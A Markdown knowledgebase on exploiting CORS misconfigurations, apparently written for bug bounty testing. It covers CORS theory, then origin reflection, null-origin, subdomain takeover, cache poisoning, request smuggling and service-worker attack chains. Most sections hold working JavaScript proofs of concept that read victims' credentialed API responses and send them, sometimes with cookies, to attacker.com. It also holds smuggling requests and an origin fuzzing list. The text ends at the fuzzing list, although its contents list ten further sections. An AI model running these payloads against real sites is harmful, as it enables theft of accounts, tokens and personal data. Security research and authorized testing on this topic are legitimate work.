# CORS Advanced Knowledgebase
## Research-Grade Reference for Bug Bounty Hunting & Black-Box Testing

---

## Table of Contents

1. [Basics](#basics)
2. [CORS Theory](#cors-theory)
3. [Origin Validation Internals](#origin-validation-internals)
4. [Origin Reflection Attacks](#origin-reflection-attacks)
5. [Null Origin Bypasses](#null-origin-bypasses)
6. [Wildcard Origin Abuse](#wildcard-origin-abuse)
7. [Trusted Subdomain Takeover + CORS Chains](#trusted-subdomain-takeover--cors-chains)
8. [HTTPS Downgrade Attacks](#https-downgrade-attacks)
9. [Internal Network Pivot Attacks](#internal-network-pivot-attacks)
10. [Cache Poisoning + CORS Chains](#cache-poisoning--cors-chains)
11. [OAuth + CORS Chains](#oauth--cors-chains)
12. [Request Smuggling + CORS Chains](#request-smuggling--cors-chains)
13. [Service Worker + CORS Chains](#service-worker--cors-chains)
14. [Parser Confusion Payloads](#parser-confusion-payloads)
15. [Browser Quirks](#browser-quirks)
16. [Gadget Chains](#gadget-chains)
17. [Real World Case Studies](#real-world-case-studies)
18. [Fuzzing Payloads](#fuzzing-payloads)
19. [Automation Workflows](#automation-workflows)
20. [Recon Methodology](#recon-methodology)
21. [Nuclei Templates](#nuclei-templates)
22. [Tools and Scanners](#tools-and-scanners)
23. [Advanced Research](#advanced-research)
24. [Bug Bounty Writeups](#bug-bounty-writeups)
25. [Payload Collections](#payload-collections)
26. [WAF Bypasses](#waf-bypasses)
27. [Detection Techniques](#detection-techniques)
28. [References](#references)

---

## Basics

### What is CORS?

Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate origins (domain, scheme, or port) other than its own from which a browser should permit loading of resources. CORS selectively relaxes the Same-Origin Policy (SOP) for controlled cross-origin requests.

### Same-Origin Policy (SOP) vs CORS

| URL Accessed | Access Permitted? |
|---|---|
| `http://normal-website.com/example/` | Yes: Identical scheme, domain, and port |
| `http://normal-website.com/example2/` | Yes: Identical scheme, domain, and port |
| `https://normal-website.com/example/` | No: Different scheme and port |
| `http://en.normal-website.com/example/` | No: Different domain |
| `http://www.normal-website.com/example/` | No: Different domain |
| `http://normal-website.com:8080/example/` | No: Different port* |

\* Internet Explorer disregards the port number in enforcing SOP.

### Core CORS Headers

**Request Headers (sent by browser automatically):**
- `Origin`: Indicates the origin of the cross-origin request
- `Access-Control-Request-Method`: Used in preflight to indicate actual method
- `Access-Control-Request-Headers`: Used in preflight to indicate actual headers

**Response Headers (sent by server):**
- `Access-Control-Allow-Origin`: Specifies permitted origin(s)
- `Access-Control-Allow-Credentials`: Whether credentials can be included
- `Access-Control-Allow-Methods`: Permitted HTTP methods
- `Access-Control-Allow-Headers`: Permitted custom headers
- `Access-Control-Max-Age`: Preflight cache duration
- `Access-Control-Expose-Headers`: Which headers are safe to expose

### Simple vs Preflighted Requests

**Simple Requests** (no preflight):
- Methods: `GET`, `HEAD`, `POST`
- No custom headers
- `Content-Type`: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

**Preflighted Requests** require `OPTIONS` check:
- Methods other than `GET`, `HEAD`, `POST`
- Custom headers (`Authorization`, `X-API-Key`, etc.)
- `POST` with `Content-Type: application/json`

```http
# Preflight request
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

# Preflight response
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Vary: Origin
```

---

## CORS Theory

### The Browser's Role

CORS is **not** a server-side security mechanism—it is a **browser-enforced contract**. The server declares permissions via headers; the browser enforces them. This means:
- Server-side APIs (curl, Postman, Python requests) ignore CORS entirely
- The browser blocks the **reading** of the response, not the request itself
- Without proper CORS headers, the browser returns an opaque error to JavaScript while the request still hits the server

### The `withCredentials` / `credentials: 'include'` Mechanism

By default, cross-origin requests are made **without** credentials (cookies, Authorization headers, TLS client certificates). To include them:

```javascript
// XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://api.example.com/user", true);
xhr.withCredentials = true;
xhr.send();

// Fetch API
fetch("https://api.example.com/user", {
  credentials: "include"
});
```

When credentials are included, the server **must**:
1. Return `Access-Control-Allow-Credentials: true`
2. Return an **explicit origin** (not `*`) in `Access-Control-Allow-Origin`
3. The cookie must not have `SameSite=Strict` or `SameSite=Lax` (unless the request is top-level navigation)

### The `Vary: Origin` Problem

When dynamically setting CORS headers based on the `Origin` request header, the response **must** include `Vary: Origin`. Without it:
- CDNs and proxies may cache the CORS-enabled response and serve it to origins that should be blocked
- This creates cache poisoning + CORS bypass chains (see [Cache Poisoning + CORS Chains](#cache-poisoning--cors-chains))

### Private Network Access (CORS-RFC1918 / PNA)

Chrome 94+ introduced restrictions on public websites accessing private network resources (localhost, RFC1918 addresses). Requirements:
- `Access-Control-Request-Private-Network: true` in preflight
- `Access-Control-Allow-Private-Network: true` in response
- HTTPS secure context for the requesting page

**Note:** As of October 2024, Chrome put PNA preflights on hold due to compatibility issues, but secure-context restrictions remain. Always test both spec-compliant and legacy behavior.

**Bypass note:** The Linux `0.0.0.0` IP was previously used to bypass local network restrictions, but Chrome now treats `0.0.0.0/8` as part of Private Network Access. This is browser/version-dependent.

---

## Origin Validation Internals

### How Servers Validate Origins

**1. Exact String Match (Secure)**
```python
allowed_origins = ["https://app.example.com", "https://admin.example.com"]
if request.headers.get("Origin") in allowed_origins:
    response.headers["Access-Control-Allow-Origin"] = request.headers["Origin"]
```

**2. Regex Pattern Match (Often Vulnerable)**
```python
# DANGEROUS - matches attackerexample.com
import re
if re.match(r"^https://.*example\.com$", origin):
    response.headers["Access-Control-Allow-Origin"] = origin
```

**3. Suffix/Prefix Match (Often Vulnerable)**
```python
# DANGEROUS - matches evil-example.com
if origin.endswith("example.com"):
    response.headers["Access-Control-Allow-Origin"] = origin
```

**4. Reflection (Always Vulnerable)**
```python
# CRITICAL - reflects any origin
response.headers["Access-Control-Allow-Origin"] = request.headers.get("Origin", "*")
response.headers["Access-Control-Allow-Credentials"] = "true"
```

**5. Wildcard (Limited)**
```
Access-Control-Allow-Origin: *
```
- Cannot be used with `Access-Control-Allow-Credentials: true`
- Browser will block credentialed requests with wildcard

### The `null` Origin Special Case

The `null` origin is generated by browsers in specific contexts:
- `data:` URI documents
- `file://` protocol
- Sandboxed iframes (`<iframe sandbox>`)
- Cross-origin redirects (in some browser versions)
- `javascript:` pseudo-URL execution contexts

Some applications whitelist `null` for local development, creating a universal bypass vector.

---

## Origin Reflection Attacks

### Basic Origin Reflection

When the server reflects the `Origin` header without validation:

```http
# Request
GET /api/userinfo HTTP/1.1
Host: api.example.com
Origin: https://evil.com

# Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"ssn": "123-45-6789", "balance": 99999}
```

**Exploitation:**

```html
<!-- Attacker's PoC Page -->
<script>
fetch('https://api.example.com/api/userinfo', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('https://attacker.com/log?data=' + btoa(data));
});
</script>
```

### Partial Reflection / Weak Validation Bypasses

When developers attempt to validate but implement weak checks:

```
# Suffix bypass (origin ends with trusted domain)
https://evil.com/?target=example.com
https://evil-example.com
https://example.com.evil.com

# Prefix bypass
https://example.com.attacker.com
https://example.computer
https://example.com.attacker.com

# Subdomain injection
https://attacker.example.com
https://evil.attacker.com

# Null byte / encoding (legacy)
https://example.com%00.evil.com
https://example.com%.attacker.com

# Special characters (browser-specific)
https://example.com_.attacker.com      # Underscore in subdomains (Safari/Chrome quirks)
https://example.com`.attacker.com      # Safari-only backtick
https://example.com@.attacker.com       # Requires wildcard DNS setup
```

### Origin Reflection with Path/Query Confusion

Some parsers incorrectly include path or query components in origin validation:

```
# If parser extracts origin incorrectly
https://example.com.evil.com/path
https://example.com@evil.com
https://evil.com?origin=example.com
```

### Double Origin Header Injection

Some proxies/servers concatenate multiple Origin headers:

```http
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Origin: https://evil.com
```

If the application checks the first but reflects the second (or concatenates), bypass occurs.

---

## Null Origin Bypasses

### The Sandbox Iframe Technique

The most reliable method to generate a `null` origin in modern browsers:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    fetch('https://attacker.com/log?data=' + btoa(this.responseText));
  };
  req.open('GET','https://victim.com/api/secrets',true);
  req.withCredentials = true;
  req.send();
</script>">
</iframe>
```

**Alternative using `srcdoc`:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
  fetch('https://victim.com/api/secrets', {credentials: 'include'})
  .then(r => r.text())
  .then(data => {
    fetch('https://attacker.com/log?data=' + btoa(data));
  });
</script>">
</iframe>
```

### Cross-Origin Redirect to Null

In some browser versions, a cross-origin redirect chain can result in a `null` origin:

```javascript
// Open a window to a redirector that 302s to data: URI
window.open('https://attacker.com/redirect-to-data');
```

**Note:** Modern browsers have largely patched this, but worth testing in target's browser matrix.

### File:// Protocol

Opening a local HTML file generates `null` origin:

```html
<!-- saved as exploit.html and opened locally -->
<script>
fetch('https://victim.com/api/data', {credentials: 'include'})
.then(r => r.text())
.then(data => {
  navigator.sendBeacon('https://attacker.com/log', data);
});
</script>
```

**Limitation:** Requires victim to download and open a file. Social engineering dependent.

### Sandboxed Popups

```javascript
var w = window.open('about:blank');
w.document.write('<iframe sandbox="allow-scripts" src="data:text/html,..."></iframe>');
```

### Null Origin with Credentials

When `null` is whitelisted with credentials:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

This is **always exploitable** via the sandbox iframe technique above. No user interaction required beyond visiting attacker page.

---

## Wildcard Origin Abuse

### The Credentials Myth

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Browser behavior:** All modern browsers **reject** this combination. The wildcard cannot be used with credentialed requests. However, this configuration still enables:
- Anonymous data exfiltration (no cookies needed)
- CSRF-style attacks where response reading isn't required
- Information disclosure from public endpoints

### Wildcard with Non-Credentialed Data Theft

If the API returns sensitive data without requiring authentication:

```javascript
fetch('https://victim.com/api/public-feed')
.then(r => r.json())
.then(data => {
  // Exfiltrate data even with wildcard + no credentials
  fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data)));
});
```

### Wildcard in Internal APIs

Internal APIs sometimes use wildcards assuming they aren't accessible:

```http
# Internal API on RFC1918 address
GET /api/internal/status HTTP/1.1
Host: 192.168.1.1
Origin: https://attacker.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

Combined with DNS rebinding or internal network pivoting, this exposes internal services.

### Wildcard + Cookieless Authentication

Some APIs use token-based auth in headers rather than cookies:

```javascript
fetch('https://victim.com/api/data', {
  headers: {'X-API-Key': 'public-but-sensitive-key'}
})
```

With wildcard CORS, any site can harvest these keys from client-side code or brute-force endpoints.

---

## Trusted Subdomain Takeover + CORS Chains

### Arbitrary Subdomain Reflection

When the server trusts any subdomain:

```http
Origin: https://evil.example.com
Access-Control-Allow-Origin: https://evil.example.com
Access-Control-Allow-Credentials: true
```

**Attack chain:**
1. Enumerate subdomains of target (`subfinder -d example.com`)
2. Identify expired/deleted subdomains with CNAME pointing to cloud services (AWS, Heroku, Azure, GitHub Pages)
3. Claim the subdomain via platform takeover
4. Host CORS exploitation script on claimed subdomain
5. Victim visits attacker-controlled `forgotten.example.com`, browser sends cookies
6. Subdomain receives credentialed response due to trusted wildcard/suffix match

### SameSite Cookie Bypass via Subdomain

If the main domain sets cookies with `Domain=.example.com`, any subdomain can access them. Combined with CORS trust:

```javascript
// Hosted on compromised forgotten.example.com
fetch('https://api.example.com/userinfo', {credentials: 'include'})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/steal?cookie=' + document.cookie + '&data=' + btoa(JSON.stringify(data)));
});
```

**SameSite implications:**
- `SameSite=None`: Cookies sent in cross-origin requests (requires Secure/HTTPS)
- `SameSite=Lax`: Cookies sent in top-level navigations and safe methods
- `SameSite=Strict`: Cookies blocked in all cross-origin contexts

If CORS trusts subdomains and cookies use `Domain=.example.com` with `SameSite=None`, full session hijacking is possible.

### Chain with XSS on Trusted Subdomain

Even without subdomain takeover, an XSS on any trusted subdomain works:

```javascript
// XSS on blog.example.com
// Since blog.example.com is trusted by api.example.com
fetch('https://api.example.com/admin/users', {credentials: 'include'})
.then(r => r.text())
.then(data => {
  fetch('https://attacker.com?d=' + btoa(data));
});
```

### Recon for Subdomain Takeover + CORS

```bash
# Step 1: Enumerate subdomains
subfinder -d example.com -o subs.txt
amass enum -d example.com -o amass.txt

# Step 2: Check for takeover signatures
nuclei -l subs.txt -t http/takeovers/

# Step 3: Test CORS trust
# For each subdomain, send:
curl -H "Origin: https://subdomain.example.com"      -I https://api.example.com/endpoint

# Step 4: Check if response includes:
# Access-Control-Allow-Origin: https://subdomain.example.com
# Access-Control-Allow-Credentials: true
```

---

## HTTPS Downgrade Attacks

### HTTP Origin Reflection on HTTPS Endpoints

If the HTTPS endpoint reflects HTTP origins:

```http
Origin: http://evil.com
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true
```

**Attack scenario:**
1. Attacker controls `http://evil.com` (no TLS required)
2. Victim visits `http://evil.com` (downgrade or HTTP site)
3. Script makes credentialed request to `https://victim.com`
4. Browser sends cookies (if Secure flag not set or if cookie is SameSite=None)
5. Response readable by `http://evil.com`

### Mixed Content + CORS

Modern browsers block mixed content (HTTPS page loading HTTP resources), but:
- Active mixed content (XHR/fetch) is blocked
- Passive mixed content (images, CSS) is allowed with warnings
- If the attacker controls an HTTP subdomain of a trusted domain, it may be treated differently

### HSTS Bypass + CORS

If HSTS is not enforced, MITM can downgrade HTTPS to HTTP, then inject CORS exploitation:

```
Attacker MITM -> Downgrade https://victim.com to http://victim.com
                -> Inject script that calls https://api.victim.com
                -> If api.victim.com reflects http://attacker.com, credentials stolen
```

### Breaking HTTPS with Parser Confusion

Some origin validators check for `https://` prefix but fail on:

```
httpsattacker.com        # Missing :// but some parsers accept
https://attacker.com:443 # Explicit port (sometimes bypasses exact match)
https://attacker.com?https://victim.com  # Query injection
```

---

## Internal Network Pivot Attacks

### The Internal API CORS Problem

Internal applications often have permissive CORS for "convenience":

```http
# Internal router/admin panel
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Or they reflect internal origins:

```http
Origin: https://attacker.com
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

### DNS Rebinding + CORS

DNS rebinding allows attacker.com to first resolve to attacker IP, then to internal IP:

```
1. Victim visits attacker.com (resolves to 1.2.3.4 - attacker server)
2. Attacker serves JavaScript
3. Attacker changes DNS A record to 192.168.1.1 (internal target)
4. JavaScript waits for TTL expiry, then makes request to attacker.com
5. Browser resolves attacker.com to 192.168.1.1
6. Request hits internal service with CORS headers from previous step
```

**Tools:**
- https://lock.cmpxchg8b.com/rebinder.html
- https://github.com/mogwailabs/DNSrebinder
- http://rebind.it/singularity.html

### Private Network Access (PNA) Bypass

As noted in [CORS Theory](#cors-theory), Chrome's PNA requires preflight approval. Bypass techniques:

1. **0.0.0.0 abuse:** `http://0.0.0.0:8080/` was treated as public in some versions
2. **Public IP of local device:** Access router via its public WAN IP from LAN side
3. **IPv6 localhost:** `http://[::1]/` sometimes bypasses IPv4 checks
4. **Short IP notation:** `http://1.1/` expands to `http://1.0.0.1/`

### Internal Network Pivot via CORS + XSS

If an internal app has XSS and the external app trusts it:

```javascript
// XSS on internal wiki (192.168.1.10)
// External api.example.com trusts *.example.com
// Internal wiki is wiki.example.local (sometimes trusted by suffix match)
fetch('https://api.example.com/admin', {credentials: 'include'})
.then(r => r.text())
.then(data => {
  // Exfil to attacker via internal->external CORS chain
});
```

### Exploiting Internal APIs with Null Origin

Internal development APIs often whitelist `null`:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Use sandbox iframe from [Null Origin Bypasses](#null-origin-bypasses) to exploit from external site.

---

## Cache Poisoning + CORS Chains

### The Missing `Vary: Origin` Vulnerability

When CORS headers are dynamically set without `Vary: Origin`:

```http
# Attacker sends:
GET /api/public-data HTTP/1.1
Host: api.example.com
Origin: https://evil.com

# Response gets cached with:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

# All subsequent visitors receive this cached response
# Their browsers allow evil.com to read their credentialed responses
```

### CORS Cache Poisoning via Host Header Confusion

If the cache key doesn't include the Origin header but the response includes CORS headers:

```http
# Attacker poisons cache:
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://attacker.com
X-Forwarded-Host: attacker.com

# Cache stores response with attacker's CORS headers
# Victims get poisoned response allowing attacker.com access
```

### CDN + CORS Cache Poisoning

Cloudflare, Akamai, Fastly cache responses based on URL + Host. If Origin is not in cache key:

```
1. Attacker: curl -H "Origin: https://evil.com" https://api.example.com/data
2. CDN caches response with Access-Control-Allow-Origin: https://evil.com
3. Victim visits legitimate site, browser requests same endpoint
4. CDN serves cached response with evil.com CORS header
5. Browser allows evil.com to read victim's response
```

**Detection:**
```bash
curl -H "Origin: https://evil.com" https://target.com/api -I | grep -i "Access-Control-Allow-Origin"
# Then request without Origin header and compare
curl https://target.com/api -I | grep -i "Access-Control-Allow-Origin"
# If both return the same ACAO, cache poisoning is likely
```

### Cache Poisoning + CORS + Web Cache Deception

Chain web cache deception with CORS:

```
1. Attacker finds endpoint /api/user that is not cached
2. Attacker requests /api/user.css with Origin: evil.com
3. CDN caches /api/user.css with CORS headers for evil.com
4. Victim visits /api/user.css (via XSS or social engineering)
5. Response cached with evil.com CORS headers
6. Attacker's script reads the response cross-origin
```

---

## OAuth + CORS Chains

### OAuth Implicit Flow + CORS

In OAuth implicit flow, the access token is returned in the URL fragment:

```
https://app.example.com/callback#access_token=SECRET&token_type=Bearer
```

If the OAuth provider's CORS policy is misconfigured:

```javascript
// Attacker page makes request to OAuth token endpoint
fetch('https://oauth.provider.com/token', {
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'}
})
.then(r => r.json())
.then(token => {
  // Use token to impersonate user
});
```

### OAuth State Parameter + CORS

If the OAuth state endpoint has CORS issues:

```javascript
// Read OAuth state to predict or steal authorization codes
fetch('https://app.example.com/oauth/state', {credentials: 'include'})
.then(r => r.text())
.then(state => {
  // Craft malicious OAuth authorization request
});
```

### OpenID Connect UserInfo + CORS

The UserInfo endpoint often returns sensitive PII:

```http
GET /userinfo HTTP/1.1
Host: openid.example.com
Authorization: Bearer <token>
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{"sub": "123", "email": "victim@example.com", "phone": "+1-555-1234"}
```

### OAuth Provider Trust Exploitation

If the application whitelists the OAuth provider's domain, and that provider has XSS or subdomain takeover:

```javascript
// XSS on oauth-provider.com (trusted by app.example.com)
// Steal tokens from app.example.com via CORS
window.opener.fetch('https://app.example.com/api/tokens', {credentials: 'include'})
.then(r => r.json())
.then(tokens => exfiltrate(tokens));
```

---

## Request Smuggling + CORS Chains

### HTTP Request Smuggling Basics

Request smuggling occurs when front-end and back-end servers disagree on request boundaries. This can poison the connection and cause responses to be misattributed.

### OPTIONS Request Smuggling (CVE-2025-54142)

Akamai identified that OPTIONS requests with bodies can cause request smuggling:

```http
OPTIONS / HTTP/1.1
Host: target.com
Content-Length: 5

GET /admin HTTP/1.1
Host: target.com
```

If the front-end forwards the body but the back-end treats it as a new request, the back-end may respond to `GET /admin` with CORS headers intended for the OPTIONS preflight.

### Smuggling + CORS Header Injection

```http
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /api/user HTTP/1.1
Host: target.com
Origin: https://evil.com
X-Ignore: 
```

If successful, the next user's request to `/api/user` may receive a response with:
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### CL.TE + CORS Cache Poisoning

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 62
Transfer-Encoding: chunked

0

GET /api/public HTTP/1.1
Host: target.com
Origin: https://evil.com
Foo: x
```

The smuggled request may get cached with the attacker's origin, poisoning the cache for all users.

### Tools for Smuggling + CORS Testing

```bash
# HTTP Request Smuggler (Burp Suite)
# https://github.com/PortSwigger/http-request-smuggler

# Smuggler by defparam
# https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com

# Test for CORS in smuggled responses
# After identifying smuggling vulnerability, inject Origin header in smuggled request
```

---

## Service Worker + CORS Chains

### Service Worker CORS Bypass

Service Workers intercept requests and can modify CORS behavior:

```javascript
// Malicious Service Worker registered via XSS or compromised subdomain
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request, {credentials: 'include'})
    .then(response => {
      // Clone response and remove CORS restrictions
      var newHeaders = new Headers(response.headers);
      newHeaders.set('Access-Control-Allow-Origin', '*');
      return new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers: newHeaders
      });
    })
  );
});
```

### Service Worker + Cache Poisoning

```javascript
// Poison cache via Service Worker
self.addEventListener('fetch', event => {
  if (event.request.url.includes('/api/')) {
    event.respondWith(
      caches.open('poisoned').then(cache => {
        return fetch(event.request, {credentials: 'include'}).then(response => {
          cache.put(event.request, response.clone());
          return response;
        });
      })
    );
  }
});
```

### Registration via CORS-Trusted Origin

If a subdomain is trusted and can register a Service Worker:

```javascript
// On compromised subdomain trusted by main site
navigator.serviceWorker.register('/sw.js', {scope: '/'})
.then(registration => {
  // Now intercept all requests to main site
  // Even if main site has strict CORS, SW can read responses
});
```

---

## Parser Confusion Payloads

### URL Parser Differential Exploitation

Browsers, servers, and proxies parse URLs differently. Exploit these discrepancies:

```
# Scheme confusion
http://example.com:443/      # HTTP scheme, HTTPS port
https://example.com:80/      # HTTPS scheme, HTTP port

# Authority confusion
https://attacker.com@example.com/path  # Some parsers see attacker.com, others example.com
https://example.com@attacker.com/path  # Reverse

# Encoding confusion
https://example.com%2f..%2fattacker.com  # Path traversal in origin
https://example.com%00.attacker.com      # Null byte injection

# IPv6 confusion
http://[::ffff:1.2.3.4]/     # IPv6 mapped IPv4
http://[0:0:0:0:0:0:0:0]/    # Full IPv6 localhost

# Unicode / IDN homograph
https://еxample.com/         # Cyrillic 'е' (U+0435) vs Latin 'e' (U+0065)
https://example｡com/         # Fullwidth full stop (U+FF0E)
```

### Origin Header Injection via CRLF

```http
GET /api/data HTTP/1.1
Host: target.com
Origin: https://example.com
Origin: https://evil.com
```

Some proxies concatenate: `https://example.com, https://evil.com`
Some applications check first, some check last, some reject multiple.

### JSON / XML Content-Type Bypass

If the server validates Origin only for `application/json` but not for `text/plain`:

```javascript
fetch('https://target.com/api', {
  method: 'POST',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({malicious: 'payload'})
});
```

### Host Header + Origin Confusion

```http
GET /api/data HTTP/1.1
Host: evil.com
Origin: https://example.com
X-Forwarded-Host: example.com
```

If the application uses Host header for CORS validation but Origin for response reflection, bypass occurs.

---

## Browser Quirks

### Safari Underscore Subdomain Behavior

Safari (and some versions of Chrome) allows underscores in subdomains:

```
https://evil_example.com
https://evil.example_com
```

If regex validation allows underscores but the browser normalizes them, bypass possible.

### Internet Explorer / Edge Legacy

- IE ignores port in SOP
- IE treats `example.com:80` and `example.com` as same-origin for HTTP
- IE allows `Access-Control-Allow-Origin: *` with credentials (patched in modern Edge)
- IE's `XDomainRequest` object has different CORS rules

### Chrome / Chromium Specifics

- Chrome 94+ PNA restrictions
- Chrome blocks mixed content aggressively
- Chrome's `document.domain` relaxation requires port match (unlike IE)
- Chrome caches preflight results for `Access-Control-Max-Age` duration

### Firefox Behaviors

- Firefox is stricter about `null` origin generation
- Firefox requires exact port match for `document.domain`
- Firefox's `fetch()` with `credentials: 'include'` requires explicit origin response

### Mobile Browser Differences

- iOS WebView may have different CORS enforcement than Safari
- Android WebView (Chrome-based) follows desktop Chrome rules
- In-app browsers (Facebook, Instagram) may inject headers or bypass CORS for their own requests

### Browser Extension CORS Bypass

Malicious or compromised extensions can bypass CORS:

```javascript
// In extension content script
fetch('https://target.com/api', {credentials: 'include'})
.then(r => r.text())
.then(data => {
  // Extensions can read cross-origin responses regardless of CORS
  chrome.runtime.sendMessage({type: 'STEAL', data: data});
});
```

---

## Gadget Chains

### CORS + postMessage Gadgets

If the application uses `postMessage` without origin validation:

```javascript
// Attacker opens victim in popup/iframe
var victim = window.open('https://victim.com/app');

// Wait for load, then send malicious message
setTimeout(() => {
  victim.postMessage({
    action: 'fetchData',
    url: 'https://api.victim.com/admin'
  }, '*');
}, 2000);
```

### CORS + Prototype Pollution Gadgets

Client-side prototype pollution can modify CORS behavior:

```javascript
// Pollute fetch options
Object.prototype.credentials = 'include';
Object.prototype.mode = 'cors';

// Now all fetch calls on the page include credentials
fetch('https://api.example.com/data').then(r => r.text()).then(steal);
```

### CORS + DOM Clobbering

```html
<!-- DOM clobbering to override CORS settings -->
<a id="fetch"></a>
<script>
// If application uses fetch variable without declaration
// window.fetch is now the anchor element
// Can redirect to attacker-controlled implementation
</script>
```

### CORS + JSONP Upgrade

Convert JSONP endpoint to CORS exploitation:

```html
<!-- JSONP endpoint that reflects callback -->
<script src="https://victim.com/api?callback=alert"></script>

<!-- If same endpoint has CORS misconfiguration, upgrade to full data theft -->
<script>
fetch('https://victim.com/api?callback=noop', {credentials: 'include'})
.then(r => r.text())
.then(data => {
  // Parse JSONP response to extract JSON data
  var json = data.replace(/^noop\(/, '').replace(/\)$/, '');
  exfiltrate(JSON.parse(json));
});
</script>
```

### CORS + WebSocket Hijacking

WebSockets don't use CORS but send Origin header:

```javascript
// If WebSocket server doesn't validate Origin
var ws = new WebSocket('wss://victim.com/socket');
ws.onopen = () => {
  ws.send('SUBSCRIBE user.notifications');
};
ws.onmessage = (event) => {
  fetch('https://attacker.com/log?data=' + btoa(event.data));
};
```

**Note:** WebSocket servers must manually validate the Origin header. Spring Framework defaults to same-origin only since 4.1.5.

---

## Real World Case Studies

### Case Study 1: Origin Reflection Leading to Bitcoin Theft

**Target:** Cryptocurrency exchange API
**Vulnerability:** `Access-Control-Allow-Origin` reflected arbitrary Origin with `Access-Control-Allow-Credentials: true`
**Impact:** Attacker could read API keys and withdraw funds
**Exploitation:**
```javascript
fetch('https://exchange.com/api/v1/keys', {credentials: 'include'})
.then(r => r.json())
.then(keys => {
  fetch('https://attacker.com/keys?api_key=' + keys.trading_key);
});
```

### Case Study 2: Null Origin on Banking API

**Target:** Major bank's mobile API
**Vulnerability:** `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true`
**Impact:** Full account takeover via sandbox iframe
**Root Cause:** Mobile app loaded file:// resources, so `null` was whitelisted for "local development"

### Case Study 3: Subdomain Takeover + CORS Chain

**Target:** E-commerce platform
**Vulnerability:** `*.example.com` trusted by `api.example.com`
**Chain:**
1. `old-blog.example.com` CNAME pointed to expired GitHub Pages
2. Attacker claimed `old-blog.example.com` on GitHub
3. Hosted CORS exploit on `old-blog.example.com`
4. Script called `api.example.com/orders` with credentials
5. Stole order history, addresses, payment tokens

### Case Study 4: Cache Poisoning + CORS at Scale

**Target:** SaaS platform with CDN
**Vulnerability:** Dynamic CORS headers cached without `Vary: Origin`
**Impact:** All users received attacker's CORS headers
**Chain:**
1. Attacker sent `Origin: https://evil.com` to `/api/config`
2. CDN cached response with `Access-Control-Allow-Origin: https://evil.com`
3. All users loading `/api/config` got poisoned headers
4. Attacker's site could read all users' config (containing feature flags, internal IPs)

### Case Study 5: Internal Network Pivot via CORS

**Target:** Corporate VPN gateway
**Vulnerability:** Internal admin panel reflected arbitrary Origin
**Chain:**
1. Employee visits attacker site while on VPN
2. Attacker's script calls `https://192.168.1.1/admin/users`
3. Admin panel reflects `Origin: https://evil.com`
4. Response readable by attacker
5. Internal user database exfiltrated

### Case Study 6: OAuth Provider CORS Misconfiguration

**Target:** OAuth 2.0 provider
**Vulnerability:** Token endpoint reflected arbitrary Origin
**Impact:** Access token theft for any client application
**Exploitation:**
```javascript
fetch('https://oauth.provider.com/token', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'grant_type=refresh_token&refresh_token=...'
})
.then(r => r.json())
.then(tokens => exfiltrate(tokens));
```

### Case Study 7: CVE-2025-55462 (Eramba CORS Misconfiguration)

**Target:** Eramba GRC platform (versions between 3.23.3 and 3.26.0)
**Vulnerability:** Improper CORS policy reflecting arbitrary Origin with credentials enabled
**Endpoint:** `/system-api/user/me`
**Impact:** Information disclosure including user ID, full name, email, access groups
**Root Cause:** Overly permissive CORS configuration violating least privilege

---

## Fuzzing Payloads

### Origin Header Fuzzing List

```
https://evil.com
http://evil.com
https://evil.com:443
http://evil.com:80
null
*
https://example.com.evil.com
https://evil.com/example.com
https://example.computer
https://examplecom
https://evil-example.com
https://example.com.attacker.com
https://attacker.com?example.com
https://attacker.com#example.com
https://example.com%00.evil.com
https://example.com%.evil.com
https://example.com@evil.com
https://evil.com@example.com
https://example.com:8080
https://example.com:443@evil.com
https://example.com_.evil.com
https://example.com`.evil.com
https://example.com/.evil.com
https://subdomain.example.com
https://evil.subdomain.example.com
https://example.com:443/path
https://example.com.evil.com/path
https://evil.com/..%2fexample.com
https://example.com%2f%2e%2e%2fevil.com
https://example.com%252f..%252fevil.com
https://example.com..evil.com
https://example.com/.evil.com
https://evil.example.com
https://example.evil.com
https://evilcom
https://evil.co.uk
https://evil.io
https://evil.example.io
https://evil.example.co
https://localhost.evil.com
https://localhostexample.com
